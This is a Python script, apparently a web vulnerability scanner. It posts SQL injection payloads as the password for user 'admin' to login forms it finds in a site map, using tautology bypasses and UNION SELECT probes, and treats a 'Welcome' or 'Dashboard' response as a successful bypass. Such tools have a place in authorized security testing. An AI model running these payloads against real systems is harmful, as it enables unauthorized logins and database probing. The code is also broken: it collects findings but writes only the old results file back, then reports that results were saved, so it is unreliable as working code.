import requests
import json

# Load mapped website data
with open("mapped_data.json", "r") as f:
    mapped_data = json.load(f)

# SQL Injection Payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 'a'='a",
    "' UNION SELECT NULL, version() --",
    "' UNION SELECT NULL, user() --"
]

print("\n🔍 Scanning for SQL Injection vulnerabilities...\n")

scan_results = {}

# Iterate over all discovered forms on each page
for page in mapped_data["pages"]:
    for form in page["forms"]:
        if form["method"] == "POST" and "username" in form["inputs"] and "password" in form["inputs"]:
            target_url = form["action"]  # Correctly fetch form action URL
            print(f"\n Testing form at: {target_url}")

            # Prepare form data
            post_data = {"username": "admin", "password": ""}

            # Inject SQL payloads
            for payload in payloads:
                post_data["password"] = payload
                print(f"🛠️  Testing payload: {payload}")

                try:
                    response = requests.post(target_url, data=post_data)

                    # Modify this condition based on how your app responds to successful logins
                    if "Welcome" in response.text or "Dashboard" in response.text:
                        print(f"  Possible SQL Injection Detected at {target_url}!")
                        print(f" Vulnerable payload: {payload}")

                        if target_url not in scan_results:
                            scan_results[target_url] = []
                        scan_results[target_url].append({
                            "payload": payload,
                            "vulnerable": True
                        })

                        break  # Stop testing if we find a vulnerability
                
                except Exception as e:
                    print(f" Error: {e}")

try:
    with open("security_scan_results.json", "r") as f:
        previous_results = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    previous_results = {}

with open("security_scan_results.json", "w") as f:
    json.dump(previous_results, f, indent=4)

print("\nScan complete! Results saved in security_scan_results.json")
